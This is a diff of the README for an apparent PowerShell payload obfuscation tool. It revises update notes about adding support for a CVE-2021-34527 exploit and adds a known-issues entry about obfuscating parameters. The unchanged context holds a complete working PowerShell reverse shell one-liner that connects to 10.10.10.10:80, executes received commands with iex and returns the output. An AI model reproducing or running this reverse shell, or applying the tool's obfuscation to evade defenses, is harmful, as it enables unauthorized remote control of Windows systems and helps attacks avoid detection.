@@ -66,9 +66,7 @@ The resulting reverse shells will not work on PowerShell v2.0. _Woah, where's th
 
 ## Supported Payloads
 
-When I was building out this tool, I was focusing on the reverse shell payload below, which is also how I tested out the compatibility of the generators. 
-
-_09/01/2021 Update: I am building a new version with two modes, ReverseShell and AdvancedPayload. The current script is built for ReverseShell but I am building out a new version to support more advanced payloads, such as the PowerShell exploits for CVE-2021-34527._
+When I was building out this tool, I was focusing on the reverse shell payload below, which is also how I tested out the compatibility of the generators. However, I am building an upgraded version of this tool to support more advanced payloads, such as the PowerShell exploit for CVE-2021-34527.
 
 ### Reverse Shell One-Liner
 
@@ -76,7 +74,11 @@ _09/01/2021 Update: I am building a new version with two modes, ReverseShell and
 $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
 
-### Obfuscated One-Liner
+### Known Issues
+
+09/03/2021 - If you are trying to obfuscate an advanced payload that uses advanced functions with custom parameters and you call that function within the same script, it will replace the parameter declaration variable but will not update the named parameter. This is corrected in the next release.
+
+## Obfuscated One-Liner
 
 ![Alt text](./screenshots/0bFu5c4t3d.jpg "0bFu5c4t3d")
 
